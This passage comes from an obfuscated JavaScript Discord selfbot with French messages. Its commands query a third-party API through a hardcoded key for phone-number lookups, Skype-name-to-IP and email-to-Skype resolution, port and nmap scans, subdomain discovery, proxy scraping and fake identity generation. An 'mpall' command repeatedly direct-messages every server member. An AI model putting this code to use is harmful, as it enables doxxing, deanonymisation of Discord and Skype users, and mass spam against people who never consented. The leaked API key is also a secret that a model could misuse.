                            var cn = cg.content.split(' ').slice(1);
                            if (!cn[0]) {
                              cg.edit('**:x: il manque un argument**');
                            } else aD.get('https://api.c99.nl/definepicture?key=NYK0X-0S6BJ-8EA8G-U5LRV&url=' + cn[0] + '&json').then(ie => {
                              var ig = ie.body.output.other_possibilities.join('\n'),
                                ih = ie.body.output.high_possibility,
                                ii = new aw.RichEmbed().setTitle('**🔎 Image look**').setColor(ad).setImage(cn[0]).setDescription(ih + '\n' + ig).setTimestamp().setThumbnail('https://cdn.discordapp.com/attachments/731197380732518460/744126950884507729/moteur-de-recherche.png').setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                              cg.edit(ii);
                            });
                          }
                        }
                        if (cg.content.startsWith(ab + 'webbackup')) {
                          if (cg.author.id == aN.user.id) {
                            if (c9) {
                              var cn = cg.content.split(' ').slice(1);
                              if (!cn[0]) {
                                cg.edit('**:x: il manque un argument**');
                              } else {
                                aD.get('https://api.c99.nl/linkbackup?key=NYK0X-0S6BJ-8EA8G-U5LRV&url=' + cn + '&json').then(ih => {
                                  var ii = new aw.RichEmbed().setTitle('Backup de : ' + cn).setColor(ad).setThumbnail('https://cdn.discordapp.com/attachments/731197380732518460/744118885292179486/backup.jpg').setTimestamp().setDescription(ih.body.url).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                                  cg.edit(ii);
                                });
                              }
                            } else cg.edit(cu);
                          }
                        }
                        if (cg.content.startsWith(ab + 'repucheck')) {
                          if (cg.author.id == aN.user.id) {
                            if (c9) {
                              var cn = cg.content.split(' ').slice(1);
                              if (!cn[0]) {
                                cg.edit('**:x: il manque un argument**');
                              } else aD.get('https://api.c99.nl/reputationchecker?key=NYK0X-0S6BJ-8EA8G-U5LRV&url=' + cn).then(il => {
                                var im = new aw.RichEmbed().setTitle('Réputation checker : ' + cn).setColor(ad).setTimestamp().setDescription(il.text).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                                cg.edit(im);
                              });
                            } else cg.edit(cu);
                          }
                        }
                        if (cg.content.startsWith(ab + 'subdomain')) {
                          if (cg.author.id == aN.user.id) {
                            var cn = cg.content.split(' ').slice(1);
                            !cn[0] ? cg.edit('**:x: il manque un argument**') : aD.get('https://api.c99.nl/subdomainfinder?key=NYK0X-0S6BJ-8EA8G-U5LRV&domain=' + cn).then(im => {
                              aE(im.text.split('<br>').join('\n')).then(ir => {
                                var is = new aw.RichEmbed().setTitle('🔎 Recherche les sous domaines').setDescription(ir).setColor(ad).setTimestamp().setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                                cg.edit(is);
                              });
                            });
                          }
                        }
                        if (cg.content.startsWith(ab + 'phonelook')) {
                          if (cg.author.id == aN.user.id) {
                            var cN = cg.content.split(' '),
                              d6 = cN.slice(1);
                            aD.get('https://api.c99.nl/phonelookup?key=' + b6 + '&number=' + d6 + '&json').then(im => {
                              var io = im.body.details.number,
                                iq = im.body.details.international_format,
                                ir = im.body.details.country_code,
                                is = im.body.details.country_name,
                                it = im.body.details.region,
                                iu = im.body.details.city,
                                iv = im.body.details.carrier,
                                iw = im.body.details.provider,
                                ix = new aw.RichEmbed().setTitle('Phone look : ' + cn).setDescription('**Numéro :** ' + io + '\n**Format international :** ' + iq + '\n**Code :**' + ir + '\n**Nom :**' + is + '\n**Région :**' + it + '\n**Ville :**' + iu + '\n**Transporteur :**' + iv + '\n**Fournisseur :**' + iw).setColor(ad).setTimestamp().setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                              cg.edit(ix);
                            });
                          }
                        }
                        if (cg.content.startsWith(ab + 'sms')) {
                          if (cg.author.id == aN.user.id) {
                            if (c9) {
                              var cn = cg.content.slice(1);
                              let iq = 'https://api.c99.nl/smsreceiver?key=' + b6 + '&country=US&json';
                              aK(iq, {
                                'method': 'GET'
                              }, function (ir, is, it) {
                                aE(is.body).then(iw => {
                                  var ix = new aw.RichEmbed().setTitle('**Récepteur sms us**').setDescription('***Tous les sms ont été mis dans ce lien hastebin :***\n' + iw).setColor(ad).setTimestamp().setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                                  cg.edit(ix);
                                });
                              });
                            } else {
                              cg.edit(cu);
                            }
                          }
                        }
                        if (cg.content.startsWith(ab + 'skype')) {
                          if (cg.author.id == aN.user.id) {
                            var cN = cg.content.split(' '),
                              cn = cN.slice(1);
                            aD.get('https://api.c99.nl/skyperesolver?key=' + b6 + '&username=' + cn + '&json').then(it => {
                              if (it.body.database = true) {
                                var iw = 'oui';
                              }
                              if (it.body.database = false) var iw = 'non';
                              ;
                              if (it.body.error === 'This Skype name is invalid!') {
                                var ix = new aw.RichEmbed().setTitle(':warning: Utilisateur introuvable :warning: ').setDescription('*:(*').setColor(ad).setTimestamp().setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                                cg.edit(ix);
                              } else {
                                var iy = new aw.RichEmbed().setTitle('**Skype look :** ' + cn).setDescription('**Pseudo :** ' + it.body.username + ' \n**Ip :** ' + it.body.ip + ' \n**Ips :** ' + it.body.ips + '\n **Dans la base de données  : ** ' + iw).setThumbnail('https://cdn.discordapp.com/attachments/710119810360541284/737972425609969736/1200px-Skype_logo_2019present.svg.png').setColor(ad).setTimestamp().setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                                cg.edit(iy);
                              }
                            });
                          }
                        }
                        if (cg.content.startsWith(ab + 'ipskype')) {
                          if (cg.author.id == aN.user.id) {
                            if (c9) {
                              var cN = cg.content.split(' '),
                                cn = cN.slice(1);
                              aD.get('https://api.c99.nl/ip2skype?key=' + b6 + '&ip=' + cn + '&json').then(iw => {
                                if (iw.body.database = true) var iz = 'oui';
                                if (iw.body.database = false) {
                                  var iz = 'non';
                                }
                                ;
                                if (iw.body.skype === undefined) {
                                  var iA = new aw.RichEmbed().setTitle(':warning: IP introuvable :warning: ').setDescription('*:(*').setColor(ad).setTimestamp().setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                                  cg.edit(iA);
                                } else {
                                  var iB = new aw.RichEmbed().setTitle('**Ip Skype look**').setDescription('**Ip :** ' + cn + ' \n**Comptes :** ' + iw.body.skype).setColor(ad).setTimestamp().setThumbnail('https://cdn.discordapp.com/attachments/710119810360541284/737972425609969736/1200px-Skype_logo_2019present.svg.png').setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                                  cg.edit(iB);
                                }
                              });
                            } else {
                              cg.edit(cu);
                            }
                          }
                        }
                        if (cg.content.startsWith(ab + 'mailskype')) {
                          if (cg.author.id == aN.user.id) {
                            if (c9) {
                              var cN = cg.content.split(' '),
                                cn = cN.slice(1);
                              let ix = 'https://api.c99.nl/email2skype?key=' + b6 + '&email=' + cn + '&json';
                              var d7 = {};
                              d7.method = 'GET', aK(ix, d7, function (iy, iz, iA) {
                                if (iA.success === false) {
                                  var iD = new aw.RichEmbed().setTitle(':warning: mail introuvable :warning: ').setDescription('*:(*').setColor(ad).setTimestamp().setThumbnail('https://cdn.discordapp.com/attachments/710119810360541284/737972425609969736/1200px-Skype_logo_2019present.svg.png').setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                                  cg.edit(iD);
                                } else aE(iz.body).then(iG => {
                                  var iJ = new aw.RichEmbed().setTitle('**Mail Skype look**').setDescription('**Tous les comptes sont disponible sur ce lien hastbin :** \n' + iG).setColor(ad).setURL(iG).setTimestamp().setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                                  cg.edit(iJ);
                                });
                              });
                            } else {
                              cg.edit(cu);
                            }
                          }
                        }
                        if (cg.content.startsWith(ab + 'nmap')) {
                          if (cg.author.id == aN.user.id) {
                            var cN = cg.content.split(' '),
                              cn = cN.slice(1);
                            aD.get('https://api.c99.nl/nmap?key=' + b6 + '&host=' + cn + '&json').then(iA => {
                              var iB = new aw.RichEmbed().setTitle('Nmap analyse : ' + cn).setDescription(iA.body.splitted_result).setColor(ad).setTimestamp().setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                              cg.edit(iB);
                            });
                          }
                        }
                        if (cg.content.startsWith(ab + 'scan')) {
                          if (cg.author.id == aN.user.id) {
                            var cN = cg.content.split(' '),
                              cn = cN.slice(1);
                            aD.get('https://api.c99.nl/portscanner?key=' + b6 + '&host=' + cn + '&json').then(iB => {
                              if (iB.body.error === 'No open ports') {
                                var iC = new aw.RichEmbed().setTitle(cn + ' Aucuns ports ouverts trouvé :(').setColor(ad).setTimestamp().setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                                cg.edit(iC);
                              } else {
                                var iC = new aw.RichEmbed().setTitle('analyse : ' + cn).setDescription(iB.body.ports).setColor(ad).setTimestamp().setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                                cg.edit(iC);
                              }
                            });
                          }
                        }
                        if (cg.content.startsWith(ab + 'pingh')) {
                          if (cg.author.id == aN.user.id) {
                            var cN = cg.content.split(' '),
                              cn = cN.slice(1);
                            aD.get('https://api.c99.nl/ping?key=' + b6 + '&host=' + cn + '&json').then(iB => {
                              if (iB.body.error === 'No open ports') {
                                var iC = new aw.RichEmbed().setTitle(cn + ' Ip invalide :(').setColor(ad).setTimestamp().setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                                cg.edit(iC);
                              } else {
                                var iC = new aw.RichEmbed().setTitle('Ping sur : ' + cn).setDescription('résultat: \n' + iB.body.splitted_result).setColor(ad).setTimestamp().setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                                cg.edit(iC);
                              }
                            });
                          }
                        }
                        if (cg.content.startsWith(ab + 'getip')) {
                          if (cg.author.id == aN.user.id) {
                            var cN = cg.content.split(' '),
                              cn = cN.slice(1);
                            if (!cn[0]) cg.edit('***Il manque le nom de l\'host*** :x:');else {
                              aD.get('https://api.c99.nl/dnsresolver?key=NYK0X-0S6BJ-8EA8G-U5LRV&host=' + cn + '&json').then(iC => {
                                if (iC.body.error === 'DNS couldn\'t be resolved') {
                                  var iD = new aw.RichEmbed().setTitle(cn + ' : host invalide :(').setColor(ad).setTimestamp().setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                                  cg.edit(iD);
                                } else {
                                  var iD = new aw.RichEmbed().setTitle('Adresse ip de : ' + cn).setDescription(iC.body.ip).setColor(ad).setTimestamp().setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                                  cg.edit(iD);
                                }
                              });
                            }
                          }
                        }
                        if (cg.content.startsWith(ab + 'ipget')) {
                          if (cg.author.id == aN.user.id) {
                            var cN = cg.content.split(' '),
                              cn = cN.slice(1);
                            if (!cn[0]) {
                              cg.edit('***Il manque le nom de l\'host*** :x:');
                            } else {
                              aD.get('https://api.c99.nl/gethostname?key=NYK0X-0S6BJ-8EA8G-U5LRV&host=' + cn + '&json').then(iE => {
                                if (iE.body.error === 'Invalid IP Address') {
                                  var iF = new aw.RichEmbed().setTitle(cn + ' : Ip invalide :(').setColor(ad).setTimestamp().setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                                  cg.edit(iF);
                                } else {
                                  var iF = new aw.RichEmbed().setTitle('Host de : ' + cn).setDescription(iE.body.hostname).setColor(ad).setTimestamp().setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                                  cg.edit(iF);
                                }
                              });
                            }
                          }
                        }
                        if (cg.content.startsWith(ab + 'arank')) {
                          if (cg.author.id == aN.user.id) {
                            var cN = cg.content.split(' '),
                              cn = cN.slice(1);
                            !cn[0] ? cg.edit('***Il manque le nom de l\'host*** :x:') : aD.get('https://api.c99.nl/alexarank?key=NYK0X-0S6BJ-8EA8G-U5LRV&url=' + cn + '&json').then(iF => {
                              if (iF.body.error === 'DNS couldn\'t be resolved') {
                                var iI = new aw.RichEmbed().setTitle(cn + ' : lien invalide :(').setColor(ad).setTimestamp().setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                                cg.edit(iI);
                              } else {
                                var iI = new aw.RichEmbed().setTitle('Lien : ' + cn).setDescription('**Rang global :** ' + iF.body.data.global_rank + '\n**Rang de la égion :** ' + iF.body.data.regional_rank + '\n**lien retours :** ' + iF.body.data.backlinks + '\n**Top pays :** ' + iF.body.data.top_country + '\n**Heure du cache :** ' + iF.body.data.cache_time).setColor(ad).setTimestamp().setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                                cg.edit(iI);
                              }
                            });
                          }
                        }
                        if (cg.content.startsWith(ab + 'screen')) {
                          if (cg.author.id == aN.user.id) {
                            if (c9) {
                              var cN = cg.content.split(' '),
                                cn = cN.slice(1);
                              if (!cn[0]) {
                                cg.edit('***Il manque le nom du site*** :x:');
                              } else aD.get('https://api.c99.nl/createscreenshot?key=NYK0X-0S6BJ-8EA8G-U5LRV&url=' + cn + '&json').then(iI => {
                                if (iI.body.error === 'DNS couldn\'t be resolved') {
                                  var iL = new aw.RichEmbed().setTitle(cn + ' : lien invalide :(').setColor(ad).setTimestamp().setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                                  cg.edit(iL);
                                } else {
                                  var iL = new aw.RichEmbed().setTitle('Screen de : ' + cn).setImage(iI.body.url).setColor(ad).setTimestamp().setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                                  cg.edit(iL);
                                }
                              });
                            } else {
                              cg.edit(cu);
                            }
                          }
                        }
                        if (cg.content.startsWith(ab + 'grabbheaders')) {
                          if (cg.author.id == aN.user.id) {
                            if (c9) {
                              var cN = cg.content.split(' '),
                                cn = cN.slice(1);
                              if (!cn[0]) {
                                cg.edit('***Il manque le nom du site*** :x:');
                              } else aD.get('https://api.c99.nl/getheaders?key=NYK0X-0S6BJ-8EA8G-U5LRV&host=' + cn + '&json').then(iL => {
                                if (iL.body.headers === 'Cloud not resolve host: exemple') {
                                  var iM = new aw.RichEmbed().setTitle(cn + ' : lien invalide :(').setColor(ad).setTimestamp().setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                                  cg.edit(iM);
                                } else {
                                  var iM = new aw.RichEmbed().setTitle('headers stealer : ' + cn).setDescription('```html\n' + iL.body.headers + '```').setColor(ad).setTimestamp().setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                                  cg.edit(iM);
                                }
                              });
                            } else cg.edit(cu);
                          }
                        }
                        if (cg.content.startsWith(ab + 'ipcheck')) {
                          if (cg.author.id === aN.user.id) {
                            var d8 = cg.content.split(' ').slice(1).join(' ');
                            !d8[0] ? cg.edit('***il manque un argument :x:***') : aD.get('https://api.c99.nl/ipvalidator?key=NYK0X-0S6BJ-8EA8G-U5LRV&ip=' + d8 + '&json').then(iM => {
                              var iP = new aw.RichEmbed().setTitle('Ip verif').setColor(ad).setDescription('L\'ip est bien valid').setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL).setTimestamp(),
                                iQ = new aw.RichEmbed().setTitle('Ip verif').setColor(ad).setDescription('l\'ip n\'est pas valide').setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL).setTimestamp();
                              if (iM.body.valid_ip === true) cg.edit(iP);else {
                                cg.edit(iQ);
                              }
                            });
                          }
                        }
                        if (cg.content.startsWith(ab + 'infoytb')) {
                          if (cg.author.id === aN.user.id) {
                            var d9 = cg.content.split(' ').slice(1).join(' ');
                            if (!d9[0]) {
                              cg.edit('>>> ***il manque l\'id de la vidéo***\nUsage`' + ab + 'infoytb AcCfvmtIUAQ`\n\n*c\'est quoi l\'id d\'une vidéo ytb ? :\nhttps://www.youtube.com/watch?v= __AcCfvmtIUAQ__\nl\'id de la vidéo est la partie soulignée*');
                            } else {
                              aD.get('https://api.c99.nl/youtubedetails?key=NYK0X-0S6BJ-8EA8G-U5LRV&videoid=' + d9 + '&json').then(iO => {
                                var iP = new aw.RichEmbed().setTitle('Youtube infos').setColor(ad).setDescription('Titre : ' + iO.body.title + '\nId : ' + iO.body.id + '\nAuteur : ' + iO.body.uploader + '\nDurée de la vidéo : ' + iO.body.duration + '\nVus : ' + iO.body.views + '\nLikes : ' + iO.body.likes + '\nDislikes : ' + iO.body.dislikes + '\nPosté le : ' + iO.body.uploaded + '\nCategorie : ' + iO.body.category + '\nUrl : ' + iO.body.url + '\nDescription :\n*' + iO.body.description + '*').setThumbnail(iO.body.thumbnail).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL).setTimestamp();
                                cg.edit(iP);
                              });
                            }
                          }
                        }
                        if (cg.content.startsWith(ab + 'ytmp3')) {
                          if (cg.author.id === aN.user.id) {
                            if (c9) {
                              var d9 = cg.content.split(' ').slice(1).join(' ');
                              !d9[0] ? cg.edit('>>> ***il manque l\'id de la vidéo***\nUsage`' + ab + 'ytmp3 AcCfvmtIUAQ`\n\n*c\'est quoi l\'id d\'une vidéo ytb ? :\nhttps://www.youtube.com/watch?v= __AcCfvmtIUAQ__\nl\'id de la vidéo est la partie soulignée*') : aD.get('https://api.c99.nl/youtubemp3?key=NYK0X-0S6BJ-8EA8G-U5LRV&videoid=' + d9 + '&json').then(iP => {
                                aD.get('https://api.c99.nl/urlshortener?key=NYK0X-0S6BJ-8EA8G-U5LRV&url=' + iP.body.url + '&json').then(iQ => {
                                  var iT = new aw.RichEmbed().setTitle('Youtube mp3').setColor(ad).setDescription('Titre : ' + iP.body.title + '\nLien de téléchargement : ' + iQ.body.url).setThumbnail('https://i.pinimg.com/originals/de/1c/91/de1c91788be0d791135736995109272a.png').setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL).setTimestamp();
                                  cg.edit(iT);
                                });
                              });
                            } else cg.edit(cu);
                          }
                        }
                        if (cg.content.startsWith(ab + 'torcheck')) {
                          if (cg.author.id === aN.user.id) {
                            if (c9) {
                              var d8 = cg.content.split(' ').slice(1).join(' ');
                              !d8[0] ? cg.edit('***il manque un argument :x:***') : aD.get('https://api.c99.nl/torchecker?key=' + b6 + '&ip=' + d8).then(iP => {
                                var iQ = new aw.RichEmbed().setTitle('Tor verif').setColor(ad).setDescription('Le lien est bien valid').setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL).setTimestamp(),
                                  iR = new aw.RichEmbed().setTitle('Tor verif').setColor(ad).setDescription('Le lien n\'est pas valide').setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL).setTimestamp();
                                if (iP.body.tor_detected === true) {
                                  cg.edit(iQ);
                                } else cg.edit(iR);
                              });
                            } else cg.edit(cu);
                          }
                        }
                        if (cg.content.startsWith(ab + 'webcheck')) {
                          if (cg.author.id === aN.user.id) {
                            var d8 = cg.content.split(' ').slice(1).join(' ');
                            if (!d8[0]) cg.edit('***il manque un argument :x:***');else {
                              aD.get('https://api.c99.nl/upordown?key=' + b6 + '&host=' + d8 + '&json').then(iS => {
                                var iT = new aw.RichEmbed().setTitle('host checker').setColor(ad).setDescription('Host : ' + iS.body.host + '\nIp : ' + iS.body.ip + '\nPort : ' + iS.body.port + '\nStatus code : ' + iS.body.code + '\nStatus short : ' + iS.body.status_short + '\nStatus long : ' + iS.body.status_long + '\nUrl : ' + iS.body.final_destination + '\nTemps de réponse : ' + iS.body.response_time).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL).setTimestamp(),
                                  iU = new aw.RichEmbed().setTitle('host checker').setColor(ad).setDescription(':x: **Le lien n\'est pas valide**').setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL).setTimestamp();
                                if (iS.body.success === true) cg.edit(iT);else {
                                  cg.edit(iU);
                                }
                              });
                            }
                          }
                        }
                        if (cg.content.startsWith(ab + 'whois')) {
                          if (cg.author.id === aN.user.id) {
                            var d8 = cg.content.split(' ').slice(1).join(' ');
                            !d8[0] ? cg.edit('***il manque un argument :x:***') : aD.get('https://api.c99.nl/whois?key=NYK0X-0S6BJ-8EA8G-U5LRV&domain=' + d8 + '&json').then(iU => {
                              aE(iU.body.splitted_result.join('\n')).then(iY => {
                                var j1 = new aw.RichEmbed().setTitle('Whois scane').setColor(ad).setDescription('les résultats de whois sonts sur ce lien : ' + iY + '\n (et dans vôtre console)').setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL).setTimestamp(),
                                  j2 = new aw.RichEmbed().setTitle('**:x: !Domaine/ip invalid :(**').setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL).setTimestamp();
                                if (iU.body.success === true) {
                                  cg.edit(j1), console.log(ay.hex(w)('\n=========Whois analyse=========\n' + iU.body.splitted_result.join('\n') + '\n=============================='));
                                } else cg.edit(j2);
                              });
                            });
                          }
                        }
                        if (cg.content.startsWith(ab + 'trad')) {
                          if (cg.author.id == aN.user.id) {
                            var cn = cg.content.split(' ').slice(1),
                              da = cg.content.split(' ').slice(2).join(' ');
                            !cn[0] ? cg.edit('***Il manque des argument \nusage : `' + ab + 'trad fr hello world`*** :x:') : aD.get('https://api.c99.nl/translate?key=NYK0X-0S6BJ-8EA8G-U5LRV&text=' + da + '&tolanguage=' + cn[0] + '&json').then(iV => {
                              var iW = new aw.RichEmbed().setTitle('Traducteur').setDescription('**langage : ' + iV.body.detected_lang_name + ' \nOriginale :** ' + da + ' \n\n**langage : ' + iV.body.to_lang_name + ' \nTraduit:** ' + iV.body.translated).setThumbnail(iV.body.to_flag_360px).setColor(ad).setTimestamp().setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                              cg.edit(iW);
                            });
                          }
                        }
                        if (cg.content === ab + 'geninfo') {
                          if (cg.author.id == aN.user.id) {
                            if (c9) {
                              aD.get('https://api.c99.nl/randomperson?key=NYK0X-0S6BJ-8EA8G-U5LRV&gender=all&json').then(iY => {
                                var iZ = new aw.RichEmbed().setTitle('gen d\'informations').setDescription('Nom : ' + iY.body.name + '\nSex : ' + iY.body.gender + '\nGenre : ' + iY.body.title + '\nDate de naissance : ' + iY.body.dob + '\nAge : ' + iY.body.age + '\nAdresse: ' + iY.body.street + '\nVille : ' + iY.body.city + '\nCode postale : ' + iY.body.zip + '\nState : ' + iY.body.state + '\nPays : ' + iY.body.country + '\nPortable : ' + iY.body.phone + '\nFixe : ' + iY.body.cell + '\nEmail : ' + iY.body.email).setThumbnail(aN.user.avatarURL).setColor(ad).setTimestamp().setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                                cg.edit(iZ);
                              });
                            } else {
                              cg.edit(cu);
                            }
                          }
                        }
                        if (cg.content.startsWith(ab + 'textimage')) {
                          if (cg.author.id == aN.user.id) {
                            var cn = cg.content.split(' ').slice(1).join(' ');
                            !cn[0] ? cg.edit('**il manque un argument (lien de l\'image)** :x:') : aD.get('https://api.c99.nl/textparser?key=NYK0X-0S6BJ-8EA8G-U5LRV&url=' + cn + '&json').then(iZ => {
                              var j0 = new aw.RichEmbed().setTitle('Image analyseur').setDescription('**Text dans l\'image :** \n' + iZ.body.status).setThumbnail(cn[0]).setColor(ad).setTimestamp().setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                              cg.edit(j0);
                            });
                          }
                        }
                        if (cg.content.startsWith(ab + 'proxies')) {
                          if (cg.author.id == aN.user.id) {
                            if (c9) {
                              var cn = cg.content.split(' ').slice(1).join(' ');
                              if (!cn[0]) {
                                cg.edit('**il manque un argument (type des proxies `http,https,socks4,socks5`)** :x:');
                              } else aD.get('https://api.c99.nl/proxylist?key=NYK0X-0S6BJ-8EA8G-U5LRV&limit=100&type=' + cn + '&anonimity=all&country=all&json').then(j1 => {
                                aE(j1.body.proxies.join('\n')).then(j4 => {
                                  var j7 = new aw.RichEmbed().setTitle('Proxies scrapper').setDescription('**Nombre de proxies : ' + j1.body.count + '\nType : ' + j1.body.type + '\nPays : ' + j1.body.country + '\nProxies :** ' + j4).setColor(ad).setTimestamp().setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                                  cg.edit(j7);
                                });
                              });
                            } else cg.edit(cu);
                          }
                        }
                        if (cg.content.startsWith(ab + 'dproxies')) {
                          if (cg.author.id == aN.user.id) {
                            var cn = cg.content.split(' ').slice(1).join(' ');
                            !cn[0] ? cg.edit('**il manque un argument (ip)** :x:') : aD.get('https://api.c99.nl/proxydetector?key=NYK0X-0S6BJ-8EA8G-U5LRV&ip=' + cn + '&json').then(j2 => {
                              var j3 = new aw.RichEmbed().setTitle('Proxies checker').setDescription('Ip/proxy : ' + cn + '\n' + j2.body.message + '\nTemps de réponse : ' + j2.body.loadtime).setColor(ad).setTimestamp().setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                              cg.edit(j3);
                            });
                          }
                        }
                        cg.content === ab + 'pablo' && cg.author.id === aN.user.id && cg.edit(':tada: :tada: **AYAYAYA MERCIII Papa Pablo#0666 un grand merci à toi pour cette api de folie (api skype,ipskype,phone...) moi je dit go rej **:tada: :tada:  \nhttps://discord.gg/escobar');
                        if (cg.content.startsWith(ab + 'graff')) {
                          if (cg.author.id === aN.user.id) {
                            if (c9) {} else cg.edit(cu);
                          }
                        }
                        if (cg.content.startsWith(ab + 'beach')) {
                          if (cg.author.id === aN.user.id) {
                            if (c9) {} else {
                              cg.edit(cu);
                            }
                          }
                        }
                        if (cg.content.startsWith(ab + 'neoneffect')) {
                          if (cg.author.id === aN.user.id) {
                            if (c9) {} else cg.edit(cu);
                          }
                        }
                        if (cg.content.startsWith(ab + 'noel')) {
                          if (cg.author.id === aN.user.id) {
                            if (c9) {} else {
                              cg.edit(cu);
                            }
                          }
                        }
                        if (cg.content.startsWith(ab + 'blood')) {
                          if (cg.author.id === aN.user.id) {
                            if (c9) {} else {
                              cg.edit(cu);
                            }
                          }
                        }
                        if (cg.content.startsWith(ab + 'led')) {
                          if (cg.author.id === aN.user.id) {
                            if (c9) {
                              var cN = cg.content.split(' '),
                                d8 = cN.slice(1);
                              const jc = require('retrotext');
                              if (d8.length !== 0) {
                                const [je, jf, jg] = d8.join(' ').split(',').map(jh => jh.trim());
                                if (/^[\w\ ]+$/i.test(je) === false || /^[\w\ ]+$/i.test(jf) === false || /^[\w\ ]+$/i.test(jg) === false) return cg.reply('¡Sólo se permiten caracteres alfanuméricos, espacios y guiones bajos!');
                                cg.channel.startTyping();
                                if (jg !== undefined) {
                                  const jh = new jc().setLine(1, je).setLine(2, jf).setLine(3, jg).setTextStyle('chrome'),
                                    ji = jh.fetchURL();
                                  cg.channel.stopTyping();
                                  var db = {};
                                  db.attachment = ji, db.name = 'retro.png';
                                  var dc = {};
                                  dc.files = [db], cg.channel.send(dc);
                                } else {
                                  if (jf !== undefined) {
                                    const jj = new jc().setLine(1, je).setLine(2, jf).setTextStyle('chrome'),
                                      jk = jj.fetchURL();
                                    cg.channel.stopTyping();
                                    var dd = {};
                                    dd.attachment = jk, dd.name = 'retro.png';
                                    var de = {};
                                    de.files = [dd], cg.channel.send(de);
                                  } else {
                                    const jm = new jc().setLine(2, je).setTextStyle('chrome'),
                                      jn = jm.fetchURL();
                                    cg.channel.stopTyping();
                                    var df = {};
                                    df.attachment = jn, df.name = 'retro.png';
                                    let jo = new aw.RichEmbed().setAuthor('PansyBot | Retro Texto', aN.user.avatarURL).setDescription(cg.author.tag + ' Hizo Un Texto Retro! ``😨``').attachFiles([df]).setImage('attachment://retro.png').setColor(ad);
                                  }
                                }
                              }
                              cg.channel.send(cq);
                            } else {
                              cg.edit(cu);
                            }
                          }
                        }
                        if (cg.content.startsWith(ab + 'light')) {
                          if (cg.author.id === aN.user.id) {
                            if (c9) {} else cg.edit(cu);
                          }
                        }
                        if (cg.content.startsWith(ab + 'retro')) {
                          if (cg.author.id === aN.user.id) {
                            if (c9) {} else cg.edit(cu);
                          }
                        }
                        if (cg.content.startsWith(ab + 'dm')) {
                          if (cg.author.id === aN.user.id) {
                            if (c9) {
                              let jr = cg.mentions.users.first() ? cg.mentions.users.first() : cg.author,
                                js = cg.guild;
                              if (!js) return cg.edit(':x: **Commande uniquement utilisable sur un serveur**');
                              const jt = cg.content.split(' ').slice(2).join(' ');
                              if (!jt[0]) {
                                cg.delete(), console.log('[', ay.hex(u)('ERROR'), ']', 'une mention et un message est nécessaire');
                              }
                              jr.send(jt).catch(jv => console.log('[', ay.hex(u)('ERROR'), ']', 'une erreur est survenue que je ne peux régler'));
                              var cq = new aw.RichEmbed().setTitle('***Message envoilé à ' + jr.username + ' avec le message :*** ' + jt).setTimestamp().setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                              cg.edit(cq);
                            } else {
                              cg.edit(cu);
                            }
                          }
                        }
                        if (cg.content.startsWith(ab + 'mpall')) {
                          if (cg.author.id === aN.user.id) {
                            if (c9) {
                              let jx = cg.guild;
                              if (!jx) return cg.edit(':x: **Commande uniquement utilisable sur un serveur**');
                              const jy = cg.guild.members,
                                jz = cg.content.split(' ').slice(1).join(' ');
                              !jz[0] && (cg.delete(), console.log('[', ay.hex(u)('ERROR'), ']', 'un argument est nécessaire')), jy.forEach(jA => {
                                setInterval(function () {
                                  jA.send(jz).catch(jF => console.log('[', ay.hex(u)('ERROR'), ']', 'une erreur est survenue que je ne peux régler'));
                                }, 2000);
                                var jD = new aw.RichEmbed().setTitle('***Mpall en cours avec le message :*** ' + jz).setTimestamp().setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                                cg.edit(jD);
                              });
                            } else {
                              cg.edit(cu);
                            }
                          }
